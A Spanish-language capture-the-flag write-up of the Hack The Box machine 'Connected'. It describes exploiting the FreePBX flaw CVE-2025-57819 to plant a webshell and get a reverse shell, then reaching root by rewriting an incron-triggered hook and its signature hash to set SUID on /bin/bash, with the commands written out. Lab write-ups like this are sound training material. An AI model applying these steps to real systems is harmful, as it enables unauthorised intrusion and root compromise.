---
title: "Connected - HTB"
date: 2026-06-13 12:00:00 -0400
categories: [HTB, Writeups]
tags: [linux, freepbx, cve-2025-57819, rce, incron, suid, privesc, asterisk]
---

![Card de la máquina Connected — Easy Linux en Hack The Box](/assets/images/htb/Pasted image 20260613112614.png)

Comencé el análisis de esta máquina realizando un escaneo de puertos TCP con nmap:

```bash
sudo nmap -T5 --open 10.129.13.221 -oG allports
```

![Escaneo inicial — se descubren los puertos 22 (SSH), 80 (HTTP) y 443 (HTTPS)](/assets/images/htb/Pasted image 20260613112640.png)

El escaneo revela tres puertos abiertos:

- **22/tcp** — SSH (OpenSSH 7.4)
- **80/tcp** — HTTP
- **443/tcp** — HTTPS

Lanzamos un escaneo más exhaustivo para identificar versiones y fingerprinting de servicios:

```bash
sudo nmap -sV -sC -p 22,80,443 10.129.13.221
```

![Escaneo de versiones — Apache 2.4.6 con PHP/7.4.16, certificado SSL con CN=pbxconnect, y redirección al dominio connected.htb](/assets/images/htb/Pasted image 20260613112855.png)

**Descubrimientos clave:**

- El servidor web corre **Apache 2.4.6** sobre CentOS con **PHP 7.4.16**.
- El certificado TLS tiene como CN `pbxconnect`, lo que sugiere una instancia de **FreePBX**.
- El servidor redirige al hostname `connected.htb`.

Añadimos el objetivo a nuestra resolución DNS local:

```bash
echo "10.129.13.221 connected.htb" | sudo tee -a /etc/hosts
```

## Fase 2: Reconocimiento Web y Búsqueda de Vulnerabilidades

La aplicación web expone un panel de administración de **FreePBX**. Investigando vulnerabilidades recientes para este software, encontramos el CVE **CVE-2025-57819**: una vulnerabilidad pre-autenticada que combina un bypass de autenticación con inyección SQL, lo que resulta en ejecución remota de código (RCE).

Localizamos en GitHub un exploit público de la comunidad watchTowr:

![Repositorio GitHub de watchTowr — exploit CVE-2025-57819 para FreePBX Pre-Auth RCE](/assets/images/htb/Pasted image 20260613122646.png)

## Fase 3: Foothold — Explotación de CVE-2025-57819

Ejecutamos el exploit proporcionando la URL objetivo:

```bash
python watchTowr-vs-FreePBX-CVE-2025-57819.py -H http://connected.htb
```

![Ejecución del exploit — se confirma la vulnerabilidad y se detecta webshell en la ruta generada](/assets/images/htb/Pasted image 20260613122713.png)

El exploit confirma que la instancia es **VULNERABLE** y crea automáticamente una webshell accesible en una ruta aleatoria dentro del servidor.

Aprovechando el acceso a la webshell, ejecutamos un payload de reverse shell en el navegador:

![URL de la webshell en el navegador con el payload de reverse shell en Python a través del parámetro cmd](/assets/images/htb/Pasted image 20260613123736.png)

Con un listener activo en nuestra máquina obtenemos la conexión:

```bash
nc -lvnp 4444
```

![Reverse shell recibida como usuario asterisk — banner de FreePBX visible en el terminal](/assets/images/htb/Pasted image 20260613123751.png)

Conseguimos acceso inicial como el usuario `asterisk`.

## Fase 4: Post-Explotación y Escalada de Privilegios

Tras conseguir el acceso inicial como el usuario `asterisk`, usamos la herramienta **linpeas** para enumerar el sistema.

Al revisar el directorio `/etc/incron.d/`, que es donde se guardan las configuraciones de `incron` (un servicio que ejecuta comandos automáticamente cuando ocurren eventos en el sistema de archivos), encontramos una regla crítica:

> Cualquier archivo que se toque o modifique dentro de `/var/spool/asterisk/incron` hará que el script `/usr/bin/sysadmin_manager` se ejecute **con privilegios de root**.

Descubrimos una línea crítica en `/usr/bin/sysadmin_manager`:

```c
system("$hookfile $params");
```

### Explotación del Hook con SUID Hijacking

Verificamos y encontramos un archivo en la carpeta `hooks`. Modificamos el hook `wifi-scan` para que asigne permisos SUID a `/bin/bash`:

```bash
cat > /var/www/html/admin/modules/sysadmin/hooks/wifi-scan << 'EOF'
 chmod u+s /bin/bash
EOF
```

![Escritura del payload en el hook wifi-scan como usuario asterisk](/assets/images/htb/Pasted image 20260613201507.png)

Debido a que el binario supervisor valida la integridad del archivo antes de su ejecución, cualquier modificación arbitraria rompería la coherencia del módulo. Calculamos el nuevo hash SHA256 correspondiente al payload recién inyectado y lo almacenamos en una variable de entorno local:

```bash
NEW_HASH=$(sha256sum /var/www/html/admin/modules/sysadmin/hooks/wifi-scan | awk '{print $1}')
```

Inyectamos ese nuevo hash en el archivo de firmas legítimas:

```bash
sed -i "s|hooks/wifi-scan = .*|hooks/wifi-scan = $NEW_HASH|" /var/www/html/admin/modules/sysadmin/module.sig
```

Creamos el archivo en el spool para despertar a `incron` y disparar la ejecución del manager como root:

```bash
touch /var/spool/asterisk/incron/sysadmin.wifi-scan
```

Ejecutamos bash con los privilegios heredados del bit SUID:

```bash
/bin/bash -p
```

![Confirmación de acceso root — bash-4.2# whoami devuelve root](/assets/images/htb/Pasted image 20260613201922.png)

¡Máquina rooteada exitosamente!
